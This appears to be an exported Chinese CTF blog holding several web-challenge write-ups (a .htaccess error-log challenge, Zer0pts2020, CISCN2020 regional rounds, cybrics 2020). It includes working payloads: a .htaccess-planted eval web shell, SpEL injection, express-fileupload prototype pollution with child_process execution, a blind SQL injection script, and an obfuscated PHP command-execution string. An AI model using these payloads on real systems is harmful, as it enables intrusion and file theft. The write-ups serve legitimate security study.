<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"Hacker"</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">.</span> <span class="token string">"\nJust one chance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p>大致意思就是访问开始和结束都把index.php以外的文件都删了，然后让你写一个文件，filename只能是字母和.，content过滤了一些奇奇怪怪的内容<br>而由于filename限制在了.a-z中，所以用伪协议编码绕过内容过滤是不可能了<br>但是这些过滤和我上传一个马有什么关系呢？，所以直接传一个shell上去，不能解析，gg<br>说实话第一次遇到不能解析除了index.php以外的php文件的情况，人都傻了，后来去看了他们的docker，发现在Apache配置里写了只解析index.php<br>后来才知道应该是传.htaccess，这就是为什么上面有那一堆奇奇怪怪的过滤，然后最后又给你加了一句无意义字符。.htaccess中如果有不符合语法的内容会直接导致当前目录爆炸500<br>因为服务器刚好是Apache，只有在Apache中才能用.htaccess重写，当然也要在配置里面设置允许重写</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>知道是传htaccess之后思路可以收束一点，过滤的内容就阻止了我们把htaccess写成shell再append到index.php里，普通的利用思路就断了，但是我第一眼看这个代码的时候就觉得很奇怪，为什么把所有东西都删了又include了一个fl3g.php，我一开始还以为是这个文件修改了权限删不掉，后来才知道这就是突破点</p>
<p>htaccess可以指定errorlog写入哪个文件，也可以修改include的基础路径，也就是我们把include的路径写成一个shell，这样子include(fl3g.php)必然报错，报错信息就会有我们实质上为shell的include路径，再把errorlog写进一个地方的fl3g.php，然后再把include改成那个路径就可以实现包含fl3g.php获取shell了</p>
<p>至于如何解决后面的无意义字符串，在.htaccess中 \是下一行的连接符，就像bash中用\连接下一行内容一样，这样子用\ #就可以把下面这一行拉上来注释掉了</p>
<p>第一次include的时候发现errorlog里的shell被实体编码了，包含失败，但是可以用UTF-7编码绕过，并且可以在.htaccess中设置UTF-7解码，所以用UTF-7绕过就可以了</p>
<p>UTF-7解码工具就找到一个，在外网卡死我了<br><a href="http://toolswebtop.com/text/process/encode/utf-7">http://toolswebtop.com/text/process/encode/utf-7</a></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>记一下htaccess的payload</p>
<h4 id="第一轮"><a href="#第一轮" class="headerlink" title="第一轮"></a>第一轮</h4><pre><code>php_value include_path &quot;&lt;?php eval($_GET[&#39;a&#39;]);__halt_compiler();&quot;
php_value log_errors 1
php_value error_log /tmp/fl3g.php \ #
</code></pre>
<p>include_path的值记得UTF-7编码，然后再url编码一遍再打过去，在burp里换行就自动变空格了，手动改%0d%0a<br>这里的__halt_compoler();作用是停止解释器继续解释，即解释器运行到这就停止对整个文件的解释了，具体作用可能能防止之后有什么奇奇怪怪的东西导致脚本解析出问题吧，毕竟包含了整个日志<br>不过话说回来如果之前有人打了这么一个payload在日志里面，那么我再怎么打也没用了啊，也不知道别人后门密码是什么，新打的shell在别人的后面也没法被解析</p>
<h4 id="第二轮"><a href="#第二轮" class="headerlink" title="第二轮"></a>第二轮</h4><pre><code>php_value include_path &quot;\tmp&quot;
php_value zend.multibyte 1
php_value zend.script_encoding &quot;UTF-7&quot; \ #
</code></pre>
<p>更具体的解法就不详细说了，可以参考tr1ple师傅的博客，他也顺便记录了几个非预期<br><a href="https://www.cnblogs.com/tr1ple/p/11439994.html">https://www.cnblogs.com/tr1ple/p/11439994.html</a></p>
<h3 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h3><p>不能算是坑，应该是自己过于愚蠢，虽然后面加的那句话对PHP没有什么影响，但是我还是想注释掉它，但是它接了一个换行符，#井号注释就注释不掉，我还想着在content的末尾加一个反斜杠\，这样子就能和后面的\n拼成一个\\n，就可以把换行符吃掉了<br>想法当然是美好的，但是过于愚蠢，早该想到自己写入的这个反斜杠早该被转义了，哪还有什么机会去转义别人</p>
<h3 id="坑2"><a href="#坑2" class="headerlink" title="坑2"></a>坑2</h3><p>理论上我访问完这个脚本.htaccess才写入，而我再次访问这个脚本的时候由于解释型语言是顺序执行的，所以条件竞争在这里也没机会，执行的肯定会先把.htaccess删掉才到include，那么.htaccess就不会生效才对，那么上述的一切步骤都不合理了，为此我本地搭环境修docker整了两天<br>本地测试的时候发现就算是先删.htaccess，他设置的内容仍会生效<br>程序在运行的时候其实是把配置文件读入内存的，之后这个内容就在内存中常驻。所以像Apache这种软件修改了配置文件之后要重启一下才能重新载入新的配置文件<br>.htaccess同理，作为配置文件它在每一次执行的时候最先被载入，之后虽然执行的时候把它删了，但是它的内容已经常驻内存，在这次执行中都会受到影响，而下一次执行时就会重新读入新的.htaccess</p>
<h3 id="坑3"><a href="#坑3" class="headerlink" title="坑3"></a>坑3</h3><p>无关题目，是本地搭环境的时候的问题<br>从GitHub拉下来了docker一套，环境一起发现访问不了，拒绝连接<br>首先开端口，端口开了之后还要开防火墙（由于是自己的虚拟机就把整个防火墙关了，，，坏习惯）<br>然后问题就从拒绝连接变成了500，折腾了两天才解决<br>首先进入容器，发现Apache没启动（dockerfile里明明写了一个.sh文件里面有一句启动Apache的，不知道为什么不能启动，直接启动一下就可以了）<br>启动了Apache之后还是不行，写了一个index.html文件，发现可以访问了，但是index.php还是不行，那就是PHP的问题了，改php.ini中的display_errors，就可以看见报错，显示的是不能包含index.php之类的内容，还有一个permission denied，大致能猜出来是PHP的权限问题了<br>.php文件是不需要可执行权限的，只要可读就可以，因为执行都是有php.exe这种可执行文件完成，它读取PHP文件并执行，而我是用root搭建的index.php，index.php的权限是600，php.exe肯定不是root权限，那就没法读取index.php，权限改成755，终于访问的上了呜呜呜</p>
<p>Linux复制文件的时候权限问题是有说法的，当一个用户复制一个不属于他的文件时，这个文件的所有权会变成他自己，所以我用root去搭建docker，这个index.php的所有者也就变成了root，但是文件权限怎么还默认是600的，不然就没这么多问题了</p>
<p>但是docker正常情况下不用root也是会permission denied的，马师傅提出一个解决方案是将普通用户也加入docker的用户组中</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>php</tag>
        <tag>htaccess</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020 Can you guess it</title>
    <url>/%5BZer0pts2020%5DCan%20you%20guess%20it.html</url>
    <content><![CDATA[<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it"></a>[Zer0pts2020]Can you guess it</h1><p>外国比赛的签到题，攻击点给的很明显吧，还有一个小小的有意思的地方</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// FLAG is defined in config.php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Can you guess it<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>Can you guess it<span class="token operator">?</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token keyword">If</span> your guess is correct<span class="token punctuation">,</span> I'll give you the flag<span class="token punctuation">.</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?source<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Source<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$message</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>guess<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
</code></pre>
<p>两个点，一个是$_SERVER[‘PHP_SELF’]，这个是返回PHP当前目录与根目录的相对路径，但是访问路径被修改的话这个变量的内容也会对应的更改，如果我们访问的内容是url&#x2F;index.php&#x2F;config.php的话，$_SERVER[‘PHP_SELF’]的内容就是index.php&#x2F;config.php，然后再用basename()获取到config.php，但是这样子过不了正则</p>
<p>第二个点是猜字符，无懈可击，除非暴力破解，没机会了，这里有一个有意思的点，就是使用的对比是hash_equals函数，而不是&#x3D;&#x3D;&#x3D;，搜了一下，hash_equals相较于&#x3D;&#x3D;&#x3D;，它对比使用的时间是固定的，而&#x3D;&#x3D;&#x3D;是逐位比较，这个函数可以防止攻击者通过时间来猜测字符串长度</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>所以唯一可能的攻击点就是通过$_SERVER[‘PHP_SELF’]获取源码，需要绕过basename和正则两部分，这里看PHPmanual可以看到一个点</p>
<blockquote>
<p>basename() is locale aware, so for it to see the correct basename with multibyte character paths, the matching locale must be set using the setlocale() function.</p>
</blockquote>
<p>basename在处理多比特编码的字符串时会出现一些问题（比如中文，百度这个函数的时候全是说获取中文的问题），那么使用一个超出ascii码范围的字符就可以绕过</p>
<p>payload: <a href="http://de3fca4a-7648-4d0e-844e-60cfc5cb2a63.node3.buuoj.cn/index.php/config.php/%aa?source">http://de3fca4a-7648-4d0e-844e-60cfc5cb2a63.node3.buuoj.cn/index.php/config.php/%aa?source</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN2020华东北赛区]分区赛web wp</title>
    <url>/%5Bciscn2020%5D%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B.html</url>
    <content><![CDATA[<h1 id="CISCN2020华东北赛区-分区赛web-wp"><a href="#CISCN2020华东北赛区-分区赛web-wp" class="headerlink" title="[CISCN2020华东北赛区]分区赛web wp"></a>[CISCN2020华东北赛区]分区赛web wp</h1><p>分区赛一共6个web，做出了四个，在有解的五个题中rmb神仙拿了四个一血，唯一两个没拿到一血的一个是访问flag.php获得flag和出题人有点毛病出出来的0解傻逼脑洞题<br>web标号是到了7但是一共就六个题</p>
<h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p>三个web题，难度不是很大，有一个有问题，但是rmb神仙三十分钟内秒了三个题然后挂机一天</p>
<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>本意应该是md5弱类型和php替换绕过，但是完全没有控制flag.php的内容？？？我猜忘记打&lt;?php了，访问flag.php直接获取flag，捡了个二血(所有出了的web中rmb神仙唯一没有一血的题)</p>
<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>JAVA题，一开始输入正常的算术可以运算，但是啥都不提交的话会报错，本来我还在猜是不是js题，结果看到报错是Java题<br>SPEL注入，找了一下午的入门利用，总体思路就是加载类实现命令执行，最后发现RCE也很麻烦，好不容易找了个文件类读取flag<br>简单测试，网上抄的payload都没打通，慢慢看得到过滤了new exec String getClass T( 等各种各样构造对象或是执行命令的方法，开始翻Java文档<br>不能用new 和T( 基本上就无法取得对象，但是fuzz发现T%00(可以正常解析且绕过判断，但加载类需要使用的getClass被过滤，翻文档翻到SecureClassLoader这个类，他的加载类的函数是getSystemClassLoader，绕过了过滤。<br>读文件需要加载一个读文件类，一开始找的是java.io.File，找了半天找不到读函数？（也可能是我java零基础的缘故，文档中有提到java.nio.file.Files，跟进去看，发现有一个叫readAllLines的函数，大喜过望，然后这个函数的参数不是String而是一个PATH？？？？<br>继续翻文档，翻到java.nio.file.FileSystems，有一个FileSystems.getDefault().getPath()接受字符串参数返回path对象，总算是成了。。。。<br>然后过滤还过滤了getDefault().这一块的某个东西，测了一下不是getDefault这个词，是这个调用形式，幸好这里也能用%00绕过，不然又要继续翻文档了</p>
<p>payload <code>T%00(java.security.SecureClassLoader).getSystemClassLoader().loadClass(&quot;java.nio.file.Files&quot;).readAllLines(T%00(java.security.SecureClassLoader).getSystemClassLoader().loadClass(&quot;java.nio.file.FileSystems&quot;).getDefault%00().getPath(&quot;/flag.txt&quot;))</code><br>获取flag ciscn{Yt7NFM44ZkAHEGbuTz}</p>
<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题本来能拿三血的，呜呜呜，一言难尽<br>给了一个静态页面，抓包看到是express的后端，js题<br>一开始以为可能是静态目录配置失当的源码泄漏之类的，不对<br>扫目录无果，上超级字典扫目录无果，一度怀疑是不是一个脑洞题<br>就一个锤子用没有的static，里面放两个css样式</p>
<p>最后看响应头里面服务器是Nginx，搜了一下有一个解析漏洞导致目录穿越，可以看到web服务全部文件<br>index.js里面没什么东西，用了个express，声明两个路由，一个返回index的那个静态页面，一个返回flag.ejs，但是flag.ejs里面就一句flag在&#x2F;flag.txt，没有其他可利用逻辑，比较让人在意的就是这个express-fileupload，一般来说js经常打第三方库的漏洞吧<br>直接百度一下你就知道，看到这个第三方库的CVE，跟进跟进，一路走下来看到这个链接<br><a href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a></p>
<p>express-fileupload刚好在设置parseNested: true时有原型链污染漏洞，在渲染ejs时如果我们五人outputFunctionName就会存在命令执行，而这里也的确是返回ejs文件，很完美的漏洞环境，payload如下</p>
<pre><code>POST /4_pATh_y0u_CaNN07_Gu3ss HTTP/1.1
header.......
Content-Type: multipart/form-data; boundary=--------1566035451
Content-Length: 203

----------1566035451
Content-Disposition: form-data; name=&quot;__proto__.outputFunctionName&quot;;

x;process.mainModule.require(&#39;child_process&#39;).exec(&#39;cp /flag.txt /app/static/flag&#39;);x
----------1566035451--
</code></pre>
<p>一开始想直接ls之类的，发现没有回显，链接给的弹shell内网环境也弹不出来，最后把flag复制到了静态目录下面，访问静态目录获得flag（不过已经有目录穿越了复制到web根目录下哪都随便咯）</p>
<h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p>时间比第一天少了太多，被web2浪费了太多时间剩下的题就草草看了看</p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>SQL注入，简单测试过滤了select，分号，单双引号，等于号，空格，and，or，table之类的字段</p>
<p>比较致命的是对引号，select和分号的过滤，数据基本上都查不出来了，表名列名全部无缘，过滤分号没了堆叠注入，select也没法用堆叠注入用了</p>
<p>猜测查询语句是<code>SELECT * FROM users WHERE username=&#39;&#39; AND password=&#39;&#39;</code><br>后来队友扫目录看到hint.txt也的确是这个样子，在username处输入admin\把引号转义掉，password处内容可控，注释符注释掉最后的引号，用万能密码登录成功后显示的图片变为success.jpg，可以看出来是一个盲注<br>使用如下payload<br><code>username=admin\&amp;password=||/**//**/username/**/regexp/**/0x61/**/#</code><br>利用正则注入，完成对username和password的获取，脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://172.20.8.102/sql.php"</span>
result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
set <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true"># for k in range(1, 128):</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> set<span class="token punctuation">:</span>   
    payload <span class="token operator">=</span> <span class="token string">"||/**/password/**/regexp/**/binary/**/0x{}54514c74716c54514c74716c/**/limit/**/0,1#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(payload)</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin\\"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(res.text)</span>
    <span class="token keyword">if</span> <span class="token string">"success.jpg"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># result.append(k)</span>
        <span class="token keyword">break</span>
<span class="token comment" spellcheck="true"># print(result)</span>
</code></pre>
<p>一开始没区分大小写。。。账号密码注出来了登录能成功，但是只有success.jpg没其他东西，一度自闭。<br>后来加了个binary区分大小写，注入出来大小写正确的账号密码g2mtu TqLtqlTqLtql，登录给一个文件名c2ZtdHFs.php，访问，给一个过滤了一点点东西的命令执行，过滤了异或没过滤取反。是第五空间一个类似的题，直接取反执行命令<br><a href="https://dy.163.com/article/FI0OKSUT0511CJ6O.html">https://dy.163.com/article/FI0OKSUT0511CJ6O.html</a></p>
<p>本来想file_get_contents读flag，发现读不出来，扫目录也不行，感觉哪里不对，执行了一个phpinfo看见了disable_function和open_basedir，超级过滤，本来以为时间不够了出不了了，结果队友说没有过滤system，直接system无视open_basedir获得flag<br>payload：<code>c2ZtdHFs.php?gzmtu=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98%D1%8B%87%8B)</code></p>
<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>也是一个SQL注入，因为web2的大小写问题坑了我好久，没来得及看，呜呜呜，修也是随便修的</p>
<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>点名批评的垃圾题目<br>首先怀疑ciscn是怎么选题的，其次怀疑出题人是怎么想的，进来就给了一句no inner user就啥都没了？？？（虽然我这个题就看了十几分钟，不过好像有很多看这个题的师傅被害死了）<br>最后登录服务器修的时候才知道这个题真的不是什么正常东西<br>超级字典扫目录也扫不出这个ssrf.php，然后感觉是用ssrf来注入index什么的？最后需要ssrf先访问index.php给自己的session加一个admin属性，再用这个去属性在注入出来的PHP文件里面获取flag，这道题这个ssrf.php就已经阻止了所有人做题了，这不是个究极脑洞是什么，师傅们的超级字典都扫不出来怎么回事。其次，ssrf的正则匹配给写错了，本意是过滤file，http之类的协议，结果写崩了什么都没过滤，最后登录上去修的时候看到源码直接file协议读flag，绝了绝了绝了绝了绝了<br>并且出题人的权限控制还很玄幻，www目录下的文件全都是755 root，怎么修？最后是把原来的文件删了重新放一个新的上去</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>JavaScript</tag>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>[cybrics 2020] web wp</title>
    <url>/%5Bcybrics%202020%5D%20wp.html</url>
    <content><![CDATA[<h1 id="cybrics-2020-web-wp"><a href="#cybrics-2020-web-wp" class="headerlink" title="[cybrics 2020] web wp"></a>[cybrics 2020] web wp</h1><p>金砖五国CTF？感觉还是个大一点的比赛，看得到其他国家的队伍<br>全程看题陪跑，比赛还没结束已经开始写wp了呜呜呜呜</p>
<h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用到了谷歌的验证码服务没翻墙做不了。。。。是不是该考虑一下充点钱了</p>
<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>给了源码，一个python题</p>
